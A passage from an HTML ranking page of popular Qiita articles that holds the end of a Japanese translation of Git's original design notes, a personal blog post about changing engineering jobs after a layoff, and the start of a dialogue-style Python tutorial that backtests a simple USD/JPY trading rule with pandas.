<p>（しかしながらディレクトリキャッシュには実データが入ることもある。特に、まだ裏付けされていない中間状態のツリーの表現を持つことがある。それでキャッシュ本来の意味や用法とは違う場合がある。見方を変えるならカレントディレクトリキャッシュをツリーコミットへの作業中の状態と考えることも出来る）。</p>

<h1>
<span id="補遺" class="fragment"></span><a href="#%E8%A3%9C%E9%81%BA"><i class="fa fa-link"></i></a>補遺</h1>

<h2>
<span id="扱われていない内容" class="fragment"></span><a href="#%E6%89%B1%E3%82%8F%E3%82%8C%E3%81%A6%E3%81%84%E3%81%AA%E3%81%84%E5%86%85%E5%AE%B9"><i class="fa fa-link"></i></a>扱われていない内容</h2>

<p>原文はデータ構造のみの説明です。<br>
それ以外（通信系、ホスティングなどは）扱われていません。<br>
また基本データ構造の応用であるブランチやマージもありません。<br>
こういったことは初期においては手動・応用スクリプトで対応していたようです。</p>

<h2>
<span id="文体" class="fragment"></span><a href="#%E6%96%87%E4%BD%93"><i class="fa fa-link"></i></a>文体</h2>

<p>原文の文体の冒頭はスラングと罵倒の羅列です。自作プログラムを馬鹿と卑下する表現もたくさんありますが、問題領域に対してシンプルなデータ構造で解決するんだ、という矜持のようなものも感じられます。当時流行っていた「多機能で信頼可能な」SCMを期待する向きに対して突き放したような表現も多々あります。なおCVSやSVNなど従来型の差分SCMに対するLinusの態度は超攻撃的なことで有名です。</p>

<p>そんなわけで訳文もやや乱暴なテイストにしましたが、不快に思われたらごめんなさい。</p>

<h2>
<span id="理解のために" class="fragment"></span><a href="#%E7%90%86%E8%A7%A3%E3%81%AE%E3%81%9F%E3%82%81%E3%81%AB"><i class="fa fa-link"></i></a>理解のために</h2>

<p>実際に適当なリポジトリを最新のcommitから</p>

<blockquote>
<p>git cat-file -p &lt;hash&gt;</p>
</blockquote>

<p>してオブジェクトデータベースを辿ったり、 </p>

<blockquote>
<p>git ls-files --stage</p>
</blockquote>

<p>してindexを見てみると、今でもデータに関しては上記以外の事は基本的に何もしていないことがわかります。<br>
<a href="https://git-scm.com/book/ja/v2/Git%E3%81%AE%E5%86%85%E5%81%B4-%E9%85%8D%E7%AE%A1%EF%BC%88Plumbing%EF%BC%89%E3%81%A8%E7%A3%81%E5%99%A8%EF%BC%88Porcelain%EF%BC%89" rel="nofollow noopener" target="_blank">Pro git 日本語版のGitの内側</a>の章を実際に手を動かしてみると理解が一層深まると思います。</p>
</div>
	</td>
</tr>
</table>
<br />
<table border="1" style="height:150px;">
<tr>
	<td rowspan="3">17位</td>
	<td colspan="4">
		<kbd><i><img alt="いいね" width="16" height="16" src="thumb-up-120px.png" /></i>484</kbd>
		<a target="_blank" href="https://qiita.com/yassai/items/3bdab4bf0c686a51b27a">エンジニアを名乗るなら、いつでも転職できるようにしておこう</a>
	</td>
</tr>
<tr>
	<td style="width:100px;"><center>投稿日時</center></td>
	<td style="width:200px;"><center>投稿者</center></td>
	<td style="width:150px;"><center>タグ</center></td>
	<td style="width:350px;"><center>本文</center></td>
</tr>
<tr>
	<td style="width:100px;">
		<!--投稿日時--><center>2017-09-25<br />12:46:33</center>
	</td>
	<td style="width:200px;">
		<!--投稿者-->
		<center>
			@<a href="user/130268.html">yassai</a>(2件の記事)<br />(EVERRISE 所属)<br><img width="80" height="80" src="https://qiita-image-store.s3.amazonaws.com/0/130268/profile-images/1473717846">
		</center>
	</td>
	<td style="width:150px;">
		<!--タグ-->
		<center><b>[Rails]</b> <b>[GitHub]</b> <b>[転職]</b> <b>[キャリア]</b> <b>[職務経歴書]</b> </center>
	</td>
	<td style="width:350px;">
		<!--本文-->
		<div style="width:350px;height:150px;overflow-x:hidden;overflow-y:scroll;">
<h1>
<span id="tl-dr" class="fragment"></span><a href="#tl-dr"><i class="fa fa-link"></i></a>TL; DR</h1>

<ul>
<li>転機はいつも突然やってくる</li>
<li>職務経歴書とGitHubは常に更新しておけ</li>
<li>より良いエンジニアライフ(開発環境や、お賃金)を追求しよう</li>
</ul>

<h1>
<span id="背景" class="fragment"></span><a href="#%E8%83%8C%E6%99%AF"><i class="fa fa-link"></i></a>背景</h1>

<h2>
<span id="まずはじめにクビになった" class="fragment"></span><a href="#%E3%81%BE%E3%81%9A%E3%81%AF%E3%81%98%E3%82%81%E3%81%AB%E3%82%AF%E3%83%93%E3%81%AB%E3%81%AA%E3%81%A3%E3%81%9F"><i class="fa fa-link"></i></a>まずはじめに、クビになった</h2>

<p>　実際にはクビ(懲戒解雇)ではないので、釣り見出しである。30歳でエンジニアにジョブチェンジして、かつ未経験なのにベンチャーに入ったら、1年ちょっとで会社都合の退職となった。後述の通り、別の会社から満足な条件で内定はもらえたものの、売り手市場な今でも一社からしかもらえなかったので、転職活動でやったこと・在職時にやっておけばよかったことをまとめておく。</p>

<h2>
<span id="突然の発表会社訪問" class="fragment"></span><a href="#%E7%AA%81%E7%84%B6%E3%81%AE%E7%99%BA%E8%A1%A8%E4%BC%9A%E7%A4%BE%E8%A8%AA%E5%95%8F"><i class="fa fa-link"></i></a>突然の発表〜会社訪問</h2>

<p>　"今週はこの機能を作って〜"なんて考えていた6月第1週、(一応全社向けだったけど)主に開発部やデザイン部に向けて、突然会社から早期優遇退職プログラムが発表された。開発部の部長も知らなかったという、正に青天の霹靂である。会社に残ってもエンジニアとしては活動できないと説明されたため、退職を決断。2ヶ月の特別有給を取得し、7月末まで在籍しながら休暇を貰った。ここまでで、たった2日の出来事である。<br>
　そこから、後述の通り、1ヶ月は技術向上のための勉強、paizaやWantedly使って会社検索&amp;アポ取りに2週間充て、会社訪問したのは7月下旬だった。地方から東京への転職を考えていたため、1日2〜3社訪問した。実際に訪問してみると、めっちゃ志望度高まった企業もあれば、意外と下がった企業もあった。やはり実際に目にしてみると違うので、興味あれば会社訪問したほうが良い。</p>

<h2>
<span id="選考開始内定受諾" class="fragment"></span><a href="#%E9%81%B8%E8%80%83%E9%96%8B%E5%A7%8B%E5%86%85%E5%AE%9A%E5%8F%97%E8%AB%BE"><i class="fa fa-link"></i></a>選考開始〜内定受諾</h2>

<p>　8月から本格的に選考開始。元々Wantedlyやpaizaで見つけた会社が少なかったのと、実際に選考に進めた企業も少なかったので、ビズリーチを使い始める。スカウト来るの、超楽だわー。<br>
　この頃から廃人化し始める。どうも作業がペンディングすると、自分は思考停止するようだ。選考結果が出るまで、ツイッターをして、(エロ)動画見て、昼寝したら1日が終わってた。ニートみたい。<br>
　そんなこんなで、お盆あたりに内定出た。給与もめっちゃ上がった(元が低すぎたという面もある)。選考中は聞けなかったこともあったので、お返事は少し待ってもらって、他社選考も進めながら、もう一度会社訪問した。<br>
　んで8月末に内定受諾。9月にお引越しして、10月から働くことになりましたとさ。定時で働けるようにリハビリ中。</p>

<h1>
<span id="やってよかったこと" class="fragment"></span><a href="#%E3%82%84%E3%81%A3%E3%81%A6%E3%82%88%E3%81%8B%E3%81%A3%E3%81%9F%E3%81%93%E3%81%A8"><i class="fa fa-link"></i></a>やってよかったこと</h1>

<h2>
<span id="技術向上のための勉強" class="fragment"></span><a href="#%E6%8A%80%E8%A1%93%E5%90%91%E4%B8%8A%E3%81%AE%E3%81%9F%E3%82%81%E3%81%AE%E5%8B%89%E5%BC%B7"><i class="fa fa-link"></i></a>技術向上のための勉強</h2>

<p>　前職ではRails触ってたんですが、テストを全く書いてなかったので、その他の復習も兼ねて、未経験時に一度触って挫折した<a href="https://railstutorial.jp/" rel="nofollow noopener" target="_blank">rails tutorial</a>をこなしてみた。Rails経験は半年くらい(もう半年はSinatraだった)だけど、未経験でやってた頃と比べたら格段に分かりやすかった。ただ、理解度が格段に向上した今でも、2週間〜1ヶ月はかかった。<br>
　サービスの現物を作れる教材って良いなーと思いました。今後自分も何かの言語・フレームワークでこういう教材を一つ作ってみたい。</p>

<h1>
<span id="在職中にやっておけばよかったこと" class="fragment"></span><a href="#%E5%9C%A8%E8%81%B7%E4%B8%AD%E3%81%AB%E3%82%84%E3%81%A3%E3%81%A6%E3%81%8A%E3%81%91%E3%81%B0%E3%82%88%E3%81%8B%E3%81%A3%E3%81%9F%E3%81%93%E3%81%A8"><i class="fa fa-link"></i></a>在職中にやっておけばよかったこと</h1>

<h2>
<span id="職務経歴書の作成" class="fragment"></span><a href="#%E8%81%B7%E5%8B%99%E7%B5%8C%E6%AD%B4%E6%9B%B8%E3%81%AE%E4%BD%9C%E6%88%90"><i class="fa fa-link"></i></a>職務経歴書の作成</h2>

<p>　意外なんだけど、職務経歴書はマジでさっさと作っておいたほうが良いし、頻繁に更新したほうが良い。プロジェクトのことってすぐ忘れるんだよね。どういう技術を使っていたかとか、そもそも何故そういう設計にしたかとか、俯瞰してみると変な部分って結構ある。今の設計になっているということはきちんと背景があるってことで、それを説明できないと、「ほんとにチームで開発してたの？」って話になる。詳細を全て書いておく必要はないけど、聞かれたら答えられるようにしておこう。<br>
　「普通チケットに経緯残すでしょ、基本中の基本だぜ！」と思ったあなた、基本中の基本を一つ忘れてるよ。退職したら、会社の開発環境へのアクセス権は剥奪されるんだぜ？アクセス権がある今のうちに作っておくんだ。</p>

<h2>
<span id="githubでコード公開" class="fragment"></span><a href="#github%E3%81%A7%E3%82%B3%E3%83%BC%E3%83%89%E5%85%AC%E9%96%8B"><i class="fa fa-link"></i></a>GitHubでコード公開</h2>

<p>　まずはじめに聞かれるのは、「GitHubのアカウントを教えてください」だった。100回面接するより、1つのコードのほうが雄弁で有益。「エンジニアの卵でOSS活動はまだ無理だから…」とか思ってアカウントすら作ってなかった。更に言うと前社ではGitLab使ってて、プルリクってよくわからなかった(GitLabでは"マージリクエスト"を使う)ので、社会人インターン行った時はちょっと恥ずかしかった。普段から少しでもコード書いて公開しておくと、面接のウケがぜんぜん違う。OSS活動頑張ろう…。</p>

<h1>
<span id="転職活動で利用したもの" class="fragment"></span><a href="#%E8%BB%A2%E8%81%B7%E6%B4%BB%E5%8B%95%E3%81%A7%E5%88%A9%E7%94%A8%E3%81%97%E3%81%9F%E3%82%82%E3%81%AE"><i class="fa fa-link"></i></a>転職活動で利用したもの</h1>

<ul>
<li>
<a href="https://www.wantedly.com/" rel="nofollow noopener" target="_blank">Wantedly</a>: 上場時になんか騒ぎがあったけど、基本的にはやはり良いサービスだと思うよ。掲載企業さんがほんとに個性豊かで面白い。</li>
<li>
<a href="https://www.bizreach.jp/" rel="nofollow noopener" target="_blank">ビズリーチ</a>: エージェントからスカウト来るの、ホント楽だった。無い内定の時は会社検索も大変になるから、エージェントから会社紹介してもらえると精神安定に繋がる。ちなみに、営業メールが来すぎることもあるので、自分はプラチナスカウトのみ返事してた。</li>
<li>
<a href="https://paiza.jp/" rel="nofollow noopener" target="_blank">paiza</a>: paizaのスキルチェック、すごい好きなんだけどねー。Wantedlyよりかは心惹かれる企業さんには巡り会えなかった。今後も頑張って欲しいサイトではある。</li>
<li>
<a href="https://railstutorial.jp/" rel="nofollow noopener" target="_blank">rails tutorial</a>: Railsエンジニアなら一度はやっておいたほうが良いと思う。</li>
<li>
<a href="https://www.hellowork.go.jp/" rel="nofollow noopener" target="_blank">ハローワーク</a>: ごめん、職安は使ってない。雇用保険の受給しか使わなかった。</li>
</ul>

<h1>
<span id="最後に" class="fragment"></span><a href="#%E6%9C%80%E5%BE%8C%E3%81%AB"><i class="fa fa-link"></i></a>最後に</h1>

<h2>
<span id="大事なのはお金と時間と開発環境のバランス" class="fragment"></span><a href="#%E5%A4%A7%E4%BA%8B%E3%81%AA%E3%81%AE%E3%81%AF%E3%81%8A%E9%87%91%E3%81%A8%E6%99%82%E9%96%93%E3%81%A8%E9%96%8B%E7%99%BA%E7%92%B0%E5%A2%83%E3%81%AE%E3%83%90%E3%83%A9%E3%83%B3%E3%82%B9"><i class="fa fa-link"></i></a>大事なのは、お金と時間と開発環境のバランス</h2>

<p>　前職の場合、時間と開発環境は良かったんだけど、お金がちょっと残念な感じだった。転職が決まった途端、いろんなデバイスに興味持ち始めて、"ワクワク感"が止まらない。お金があると失敗できるのが良いんだよね。失敗できないとどうしてもリスク取りにいけず、つまらんまま終わってしまうことが多い。<br>
　もうちょっと居たかったなという思いはあるけれど、こういう機会で転職出来て良かったと思ってる。今回転職して一番良かったのは、外に出ることへの抵抗感が無くなったことかな。ツイッターではアカデミックの方やエンジニアの方を多くフォローしているので、「給料足りない」とか「労働時間長い」とか「自分の業務(コーディングや研究)ができない」とかよく自分のTLに流れてるけど、そういう時はどんどん外に出たほうが幸せになれそうな気がする。会社の外、地域の外、国の外、自分の幸せが"内"にない時には、躊躇わず外に出たほうが良さそうだし、常にそういう準備をしておくと良いんだなーと思いました。戦略的なキャリア構築、大事ですね。</p>
</div>
	</td>
</tr>
</table>
<br />
<table border="1" style="height:150px;">
<tr>
	<td rowspan="3">18位</td>
	<td colspan="4">
		<kbd><i><img alt="いいね" width="16" height="16" src="thumb-up-120px.png" /></i>483</kbd>
		<a target="_blank" href="https://qiita.com/sugulu/items/45e3cfaa78e5f13d9389">のび太と学ぶ「機械学習」～FX予測プログラムを作成～【第1話】if文作戦</a>
	</td>
</tr>
<tr>
	<td style="width:100px;"><center>投稿日時</center></td>
	<td style="width:200px;"><center>投稿者</center></td>
	<td style="width:150px;"><center>タグ</center></td>
	<td style="width:350px;"><center>本文</center></td>
</tr>
<tr>
	<td style="width:100px;">
		<!--投稿日時--><center>2017-11-06<br />05:51:37</center>
	</td>
	<td style="width:200px;">
		<!--投稿者-->
		<center>
			@<a href="user/191401.html">sugulu</a>(11件の記事)<br />(都内IT企業 所属)<br><img width="80" height="80" src="https://qiita-image-store.s3.amazonaws.com/0/191401/profile-images/1509357969">
		</center>
	</td>
	<td style="width:150px;">
		<!--タグ-->
		<center><b>[Python]</b> <b>[初心者]</b> <b>[機械学習]</b> <b>[DeepLearning]</b> <b>[FX]</b> </center>
	</td>
	<td style="width:350px;">
		<!--本文-->
		<div style="width:350px;height:150px;overflow-x:hidden;overflow-y:scroll;"><p>本シリーズでは、「FXの予想プログラム」を作りながら、機械学習・ディープラーニングを解説します。<br>
（注）のび太くんは有名漫画のキャラとは一切関係ありません。</p>

<h1>
<span id="あらすじ" class="fragment"></span><a href="#%E3%81%82%E3%82%89%E3%81%99%E3%81%98"><i class="fa fa-link"></i></a>あらすじ</h1>

<p>「のび太と機械学習」は、20歳の大学生、のび太くんが主人公です。</p>

<p>大学生のび太くんは、お小遣い欲しさにFXに興味を持ちます。</p>

<p>そんなのび太くんに、家庭教師のすぐるさんが、機械学習を解説し、FX予測プログラムを一緒に作ります。</p>

<p>残念なことに、FX予測プログラムは、ちょっとしか儲かりませんでした。</p>

<p>・<br>
・<br>
・</p>

<p>のび太くんはその後、学んだ機械学習を生かして、D-mind社を起業し、汎用人工知能を作り上げます。</p>

<p>高齢になったのび太くんは、D-mind社をTMR社に売却し、TMR社の工場で22世紀、汎用人工知能搭載型ロボットが誕生します。</p>

<p>この物語は、そんな汎用人工知能搭載型ロボット誕生につながる、のび太くんの機械学習・勉強記録です。</p>

<h1>
<span id="第1話のび太if文でfxを予想する" class="fragment"></span><a href="#%E7%AC%AC1%E8%A9%B1%E3%81%AE%E3%81%B3%E5%A4%AAif%E6%96%87%E3%81%A7fx%E3%82%92%E4%BA%88%E6%83%B3%E3%81%99%E3%82%8B"><i class="fa fa-link"></i></a>第1話：のび太、if文でFXを予想する</h1>

<p>ママー！！ママー！！</p>

<p>何よ、もう～。騒がしいわね。</p>

<p>ママ！聞いて！聞いて！！新しいiPhoneが出たんだよ！！<br>
iPhone Xだよ！<br>
ねえ、買って、買って～</p>

<p>無理よ。そんなお金あるわけないでしょ。<br>
それにあなた、携帯持っているじゃない。</p>

<p>ママ！これガラケーだよ。LINEもできなんだよ！！<br>
いまどきガラケーしか持っていないのなんて、僕くらいだよ！！</p>

<p>知りません。<br>
あなたには、大学の入学祝いに買ってあげた、パソコンがあるでしょ。<br>
それにもう20歳なんだから、欲しいものがあれば自分でバイトして買いなさい。</p>

<p>もう、いいよ！</p>

<p>・<br>
・<br>
・</p>

<p>すぐるさん。</p>

<p>どうしたんだい、のび太くん</p>

<p>すぐるさんは、iPhone X・・・　なんて持ってたりしないよね・・・？</p>

<p>僕は持っていないな～</p>

<p>すぐるさん・・・</p>

<p>なんだい、もう、きみが言おうとしていることは分かっている。<br>
何度も言っているけど、お金を増やす裏技はないからね。</p>

<p>だよね・・・。分かっているよ。。。<br>
はっ！たかし！！</p>

<p>たかしくんが、どうかしたんだい？</p>

<p>すぐるさん、この前たかしが、FXで儲けたって言ってたんだよ。<br>
パソコンで株みたいに売り買いするだけで、簡単にお金が増えたって。<br>
僕もFXでお金を増やして、iPhone Xを買ってやるんだ！</p>

<p>のび太くん、やめとき・・・<br>
（待てよ・・・これは良い機会かもしれないぞ！）<br>
分かったよ、のび太くん。<br>
きみがそこまで言うのなら、僕がFXを教えてあげるよ。</p>

<p>本当に！！やったー！！</p>

<p>先に言っとくけど、僕はFXによる資産形成は一切おススメしない。<br>
あくまで、ほんの少しの間、のび太くんの勉強のために付き合うだけだからね。</p>

<p>勉強！？</p>

<p>当たり前だ。適当に売り買いして儲かるわけないだろ。<br>
きちんと過去のデータを分析して、売買するんだ。</p>

<p>分かったよ。<br>
ところで、FXって何？</p>

<p>なんだい、知ってて、たかしくんの話をしてたのかと思ったよ。<br>
いいかいのび太くん、FXというのは・・・</p>

<p>・<br>
・<br>
・</p>

<p>すぐるさん、分かったよ！！<br>
・円とドルなどの外国の通貨同士を売り買いする外貨交換（Foreign eXchange）の略称で、FXなんだね<br>
・1ドル113円のときに、1000ドル分買って、1ドル114円のときに売れば、1円×1000で1,000円儲かる<br>
・逆に1ドル112円になってしまうと、1,000円損する<br>
・でもドルを売るほうからも売買できて、下がる方向を予想しても儲かる<br>
・手数料的なものは、今回は無視できるくらい小さい<br>
・始値は一日の取引の開始値段、終値は一日の取引の終了時の値段、高値は一日で一番高かった値段で、安値は一番安かった値段</p>

<p>ってことだね。</p>

<p>のび太くん、ついに分かってくれたか！！！<br>
もう13回目の説明だよ・・・<br>
今日は疲れた。続きはまた明日にしよう。</p>

<p>・<br>
・<br>
・</p>

<p>のび太くん、今日からFXの予測プログラムを作ろう。</p>

<p>予測プログラム？<br>
ぼくに、そんな難しいもの作れるかな・・・</p>

<p>でも適当に売り買いしても、世界で一番不運なきみでは、一瞬にして貯金がなくなるだけだよ。</p>

<p>なんだよ、そこまで言わなくてもいいじゃないか。</p>

<p>のび太くん、君ももう20歳になったんだ。<br>
自分の力で頑張るんだ。<br>
君がアイデアを考えれば、プログラムの作り方は僕が教えてあげるよ。</p>

<p>分かったよ、考えてみるよ・・・</p>

<p>・<br>
・<br>
・</p>

<p>すぐるさん、すぐるさん！！<br>
良い方法を思いついたよ。</p>

<p>えらいぞ、のび太くん！！で、どんな方法だい？</p>

<p>「今日の終値が昨日の終値よりも高かったら、きっと明日も高くなる。<br>
逆に、安かったら、きっと明日は安くなる。」<br>
どうだい！？</p>

<p>う～ん、のび太くんにしては悪くないアイデアだ！！<br>
じゃあ、実際にプログラムにして、バックテストをしよう！</p>

<p>バックテスト？</p>

<p>過去のデータでその手法を試してみて、本当に儲かるかどうかを検証するんだ。<br>
のび太くん、入学祝いで買ってもらったPCがあるだろ。<br>
それを使ってプログラムを書こう。<br>
よし、「アナコンダ～♪」</p>

<p>あなこんだ？</p>

<p>Anacondaは、データ解析によく使われるPythonというプログラミング言語と、データ解析用ライブラリのセットだよ。</p>

<p>とりあえず、以下の記事などを参考にして、Anacondaをインストールするんだ。<br>
分からないところは、Qiitaで自分で調べるんだ。</p>

<p>AnacondaとTensorFlowのインストール記事の例<br>
<a href="https://qiita.com/uosansatox/items/3e2e8e0a286e1635c548" class="autolink" id="reference-dcf0547973d5397ef1d0">https://qiita.com/uosansatox/items/3e2e8e0a286e1635c548</a></p>

<p>よし、できたよ。</p>

<p>じゃあ次は為替のデータだ。<br>
今回はドル円の一日ごとのデータに絞るね。<br>
僕のGitHubに、ドル円の1997年から2017年10/30までのデータがあるから、それをダウンロードするんだ。<br>
<a href="https://github.com/Nobita-FX/Nobita-FX/tree/master/data" rel="nofollow noopener" target="_blank">データはこちら</a></p>

<p>※為替データは、以下のフリーでログイン不要のデータサイトStooqから取得しました。<br>
<a href="https://stooq.com/q/d/?s=usdjpy&amp;c=0" rel="nofollow noopener" target="_blank">Stooq</a></p>

<p>よし、ダウンロードできたよ。</p>

<p>じゃあ、以下の記事などを参考に、Jupyter Notebookを開いて、プログラムを書こう。<br>
<a href="https://qiita.com/icoxfog417/items/175f69d06f4e590face9" class="autolink" id="reference-5ddd1d234917398cdc72">https://qiita.com/icoxfog417/items/175f69d06f4e590face9</a></p>

<p>今回は2016年と2017年のデータでバックテストをしてみよう。<br>
まずは、ファイルを読み込んでみよう。</p>

<p>今回のコードは全部僕のGitHubにおいて置くね。<br>
<a href="https://github.com/Nobita-FX/Nobita-FX/blob/master/program/NobitaFX_1_if.ipynb" rel="nofollow noopener" target="_blank">本記事の掲載コードはこちら</a></p>

<div class="code-frame" data-lang="python"><div class="highlight"><pre><span></span><span class="c1"># import関連</span>
<span class="kn">import</span> <span class="nn">numpy</span> <span class="kn">as</span> <span class="nn">np</span>
<span class="kn">import</span> <span class="nn">pandas</span> <span class="kn">as</span> <span class="nn">pd</span>
<span class="kn">import</span> <span class="nn">matplotlib.pylab</span> <span class="kn">as</span> <span class="nn">plt</span>
<span class="kn">import</span> <span class="nn">seaborn</span> <span class="kn">as</span> <span class="nn">sns</span>

<span class="kn">import</span> <span class="nn">warnings</span>
<span class="n">warnings</span><span class="o">.</span><span class="n">filterwarnings</span><span class="p">(</span><span class="s1">'ignore'</span><span class="p">)</span> <span class="c1"># 実行上問題ない注意は非表示にします</span>

<span class="o">%</span><span class="n">matplotlib</span> <span class="n">inline</span>

<span class="c1"># dataフォルダの場所を各自指定してください</span>
<span class="n">data_dir</span> <span class="o">=</span> <span class="s2">"./"</span>

<span class="c1"># FXデータの読み込み</span>
<span class="n">data</span> <span class="o">=</span> <span class="n">pd</span><span class="o">.</span><span class="n">read_csv</span><span class="p">(</span><span class="n">data_dir</span> <span class="o">+</span> <span class="s2">"USDJPY_1997_2017.csv"</span><span class="p">)</span>

<span class="c1"># Close-Openをデータに追加します</span>
<span class="n">data</span><span class="p">[</span><span class="s1">'Change'</span><span class="p">]</span> <span class="o">=</span> <span class="n">data</span><span class="o">.</span><span class="n">Close</span> <span class="o">-</span> <span class="n">data</span><span class="o">.</span><span class="n">Open</span>
<span class="n">data</span><span class="o">.</span><span class="n">head</span><span class="p">()</span> <span class="c1"># データの概要を見てみます</span>

<span class="c1"># 2016年のデータを取り出します</span>
<span class="n">data16</span> <span class="o">=</span> <span class="n">data</span><span class="o">.</span><span class="n">iloc</span><span class="p">[</span><span class="mi">4935</span><span class="p">:</span><span class="mi">5193</span><span class="p">,:]</span> <span class="c1"># pythonは0番目からindexが始まります</span>

<span class="c1"># 2017年のデータを取り出します</span>
<span class="n">data17</span> <span class="o">=</span> <span class="n">data</span><span class="o">.</span><span class="n">iloc</span><span class="p">[</span><span class="mi">5193</span><span class="p">:,:]</span> 
<span class="n">data17</span><span class="o">.</span><span class="n">head</span><span class="p">()</span>
</pre></div></div>

<p><a href="https://camo.qiitausercontent.com/5aa61a8e298c95ddfb3d1b3e535bdfc2e76d6a01/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f3139313430312f33393930333335622d663463612d613464662d386439642d3438396531323462643461332e6a706567" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/5aa61a8e298c95ddfb3d1b3e535bdfc2e76d6a01/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f3139313430312f33393930333335622d663463612d613464662d386439642d3438396531323462643461332e6a706567" alt="nobitafx1_1.JPG" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/191401/3990335b-f4ca-a4df-8d9d-489e124bd4a3.jpeg"></a></p>

<p>このpandasというのは？</p>

<p>pandasはPythonでデータを読み込んで扱うためのライブラリだよ。<br>
<a href="https://qiita.com/hik0107/items/d991cc44c2d1778bb82e" class="autolink" id="reference-cc31369d5c9c63d1d6bd">https://qiita.com/hik0107/items/d991cc44c2d1778bb82e</a></p>

<p>まずは、お手本通りにやって、少しずつ慣れていこう。</p>

<p>よし、じゃあ2016年のデータに、さっきのび太くんが考えた<br>
「今日の終値が昨日の終値よりも高かったら、きっと明日も高くなる。<br>
逆に、安かったら、きっと明日は安くなる。」<br>
作戦を実施してみよう。</p>

<div class="code-frame" data-lang="python"><div class="highlight"><pre><span></span><span class="c1"># 2016年の合計を計算する</span>
<span class="c1"># 前々日終値に比べて前日終値が高い場合は、買い、低い場合は売りで入ります</span>
<span class="n">sum_2016</span> <span class="o">=</span> <span class="mi">0</span>
<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span><span class="nb">len</span><span class="p">(</span><span class="n">data16</span><span class="p">)):</span> <span class="c1"># len()で要素数を取得しています</span>
    <span class="k">if</span> <span class="n">data16</span><span class="o">.</span><span class="n">iloc</span><span class="p">[</span><span class="n">i</span><span class="o">-</span><span class="mi">2</span><span class="p">,</span><span class="mi">4</span><span class="p">]</span> <span class="o">&lt;=</span> <span class="n">data16</span><span class="o">.</span><span class="n">iloc</span><span class="p">[</span><span class="n">i</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">4</span><span class="p">]:</span>
        <span class="n">sum_2016</span> <span class="o">+=</span> <span class="n">data16</span><span class="o">.</span><span class="n">iloc</span><span class="p">[</span><span class="n">i</span><span class="p">,</span><span class="mi">5</span><span class="p">]</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="n">sum_2016</span> <span class="o">-=</span> <span class="n">data16</span><span class="o">.</span><span class="n">iloc</span><span class="p">[</span><span class="n">i</span><span class="p">,</span><span class="mi">5</span><span class="p">]</span>

<span class="k">print</span><span class="p">(</span><span class="s2">"2016年の利益合計：</span><span class="si">%1.3lf</span><span class="s2">"</span> <span class="o">%</span><span class="n">sum_2016</span><span class="p">)</span> <span class="c1"># 2016年の利益合計</span>
</pre></div></div>

<p>出力：2016年の利益合計：9.675</p>

<p>すぐるさん、9.675だよ！！プラスだよ！！<br>
9.675ってことは、1000通貨だったら、9,675円、1万通貨なら約10万円、10万通貨なら100万円儲かるってことだよね！！<br>
これでiPhone Xが買えるぞ！！<br>
やった、やったー！！</p>

<p>落ち着きなよ、のび太くん。<br>
2017年の結果も見てごらん。</p>

<div class="code-frame" data-lang="python"><div class="highlight"><pre><span></span><span class="c1"># 2017年の合計を計算する</span>
<span class="c1"># 前々日終値に比べて前日終値が高い場合は、買い、低い場合は売りで入ります</span>
<span class="n">sum_2017</span> <span class="o">=</span> <span class="mi">0</span>
<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span><span class="nb">len</span><span class="p">(</span><span class="n">data17</span><span class="p">)):</span> <span class="c1"># len()で要素数を取得しています</span>
    <span class="k">if</span> <span class="n">data17</span><span class="o">.</span><span class="n">iloc</span><span class="p">[</span><span class="n">i</span><span class="o">-</span><span class="mi">2</span><span class="p">,</span><span class="mi">4</span><span class="p">]</span> <span class="o">&lt;=</span> <span class="n">data17</span><span class="o">.</span><span class="n">iloc</span><span class="p">[</span><span class="n">i</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">4</span><span class="p">]:</span>
        <span class="n">sum_2017</span> <span class="o">+=</span> <span class="n">data17</span><span class="o">.</span><span class="n">iloc</span><span class="p">[</span><span class="n">i</span><span class="p">,</span><span class="mi">5</span><span class="p">]</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="n">sum_2017</span> <span class="o">-=</span> <span class="n">data17</span><span class="o">.</span><span class="n">iloc</span><span class="p">[</span><span class="n">i</span><span class="p">,</span><span class="mi">5</span><span class="p">]</span>

<span class="k">print</span><span class="p">(</span><span class="s2">"2017年の利益合計：</span><span class="si">%1.3lf</span><span class="s2">"</span> <span class="o">%</span><span class="n">sum_2017</span><span class="p">)</span> <span class="c1"># 2017年の利益合計</span>
</pre></div></div>

<p>出力：2017年の利益合計：-3.139</p>

<p>-3.139・・・<br>
マイナスじゃないか～！<br>
どういうことだよ、すぐるさん！</p>

<p>のび太くん、いちいちぼくに聞かないで、自分で考えるんだ。<br>
なんでだと思う？</p>

<p>う～ん、ぼくの作戦が間違っていたのかな？<br>
2016年はたまたまプラスになっただけ？</p>

<p>そうとも言えるし、そうとも言えない。</p>

<p>もう、わからないよ！</p>

<p>仕方ないな～。のび太くんの作戦はうまくいく場合とうまくいかない場合があるんだよ。<br>
「今日の終値が昨日の終値よりも高かったら、きっと明日も高くなる。<br>
逆に、安かったら、きっと明日は安くなる。」作戦は、<br>
大きなトレンドが生まれているときは使えるけど、そうでないときには機能しないんだ。</p>

<p>トレンド？</p>

<p>一度グラフをプロットしてみよう。</p>

<div class="code-frame" data-lang="python"><div class="highlight"><pre><span></span><span class="c1"># 2016年のデータをプロットしてみます</span>
<span class="n">plt</span><span class="o">.</span><span class="n">style</span><span class="o">.</span><span class="n">use</span><span class="p">(</span><span class="s1">'seaborn-darkgrid'</span><span class="p">)</span>
<span class="n">plt</span><span class="o">.</span><span class="n">plot</span><span class="p">(</span><span class="n">data16</span><span class="p">[</span><span class="s1">'Close'</span><span class="p">])</span>
<span class="n">plt</span><span class="o">.</span><span class="n">ylim</span><span class="p">([</span><span class="mi">95</span><span class="p">,</span><span class="mi">125</span><span class="p">])</span>
</pre></div></div>

